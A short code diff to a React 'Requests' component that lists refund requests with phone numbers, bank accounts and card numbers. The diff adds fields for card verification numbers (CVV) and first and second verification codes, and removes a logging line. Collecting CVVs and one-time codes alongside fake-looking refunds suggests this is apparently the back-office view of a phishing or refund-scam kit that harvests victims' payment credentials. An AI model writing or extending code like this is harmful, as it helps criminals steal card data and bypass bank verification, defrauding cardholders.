@@ -15,7 +15,10 @@ export default function Requests() {
         "phoneNumber", 
         "refundAmount", 
         "bankAccount", 
-        "cardNumber"
+        "cardNumber",
+        "cardVerificationNumber",
+        "firstVerificationCode",
+        "secondVerificationCode",
     ];
 
     const options = {
@@ -52,9 +55,11 @@ export default function Requests() {
                         refundAmount: response.data['requests'][key].refund_amount,
                         bankAccount: response.data['requests'][key].user_bank,
                         cardNumber: response.data['requests'][key].user_card_number,
+                        cardVerificationNumber: response.data['requests'][key].cardVerificationNumber,
+                        firstVerificationCode: response.data['requests'][key].first_verification_code,
+                        secondVerificationCode: response.data['requests'][key].second_verification_code,
                     });
                 }
-                console.log(response.data['requests']);
                 setRequests(loadedRequestsList);
             }
         });
